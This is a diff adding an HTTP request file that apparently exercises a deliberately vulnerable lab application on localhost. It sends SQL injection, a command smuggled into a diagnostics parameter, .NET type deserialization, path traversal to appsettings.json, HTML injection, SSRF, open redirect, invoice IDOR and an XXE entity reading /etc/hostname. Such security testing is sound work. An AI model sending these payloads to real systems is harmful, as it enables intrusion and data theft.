@@ -1,0 +1,53 @@
+@base = http://127.0.0.1:5080
+
+### Login
+POST {{base}}/api/login
+Content-Type: application/json
+
+{"username":"admin' --","password":"wrong"}
+
+### Diagnostics
+GET {{base}}/api/diagnostics?host=localhost%3B%20printf%20LAB_COMMAND_MARKER
+
+### Import
+POST {{base}}/api/import
+Content-Type: application/json
+
+{"$type":"System.Version, System.Private.CoreLib","Major":1,"Minor":2}
+
+### Filter users
+GET {{base}}/api/users/filter?expression=Role%20%3D%3D%20%22admin%22
+
+### Encrypt
+POST {{base}}/api/crypto/encrypt
+Content-Type: application/json
+
+{"text":"repeat this block"}
+
+### Hash
+POST {{base}}/api/crypto/hash
+Content-Type: application/json
+
+{"text":"password"}
+
+### Read file
+GET {{base}}/api/files?name=..%2F..%2Fappsettings.json
+
+### Greeting
+GET {{base}}/hello?name=%3Cb%3Eunescaped%3C%2Fb%3E
+
+### Fetch URL
+GET {{base}}/api/fetch?url=http%3A%2F%2F127.0.0.1%3A5080%2F
+
+### Read invoice
+GET {{base}}/api/invoices/2
+
+### Redirect
+GET {{base}}/redirect?url=https%3A%2F%2Fexample.invalid%2F
+
+### XML import
+POST {{base}}/api/xml
+Content-Type: application/xml
+
+<!DOCTYPE note [<!ENTITY demo SYSTEM "file:///etc/hostname">]>
+<note>&demo;</note>
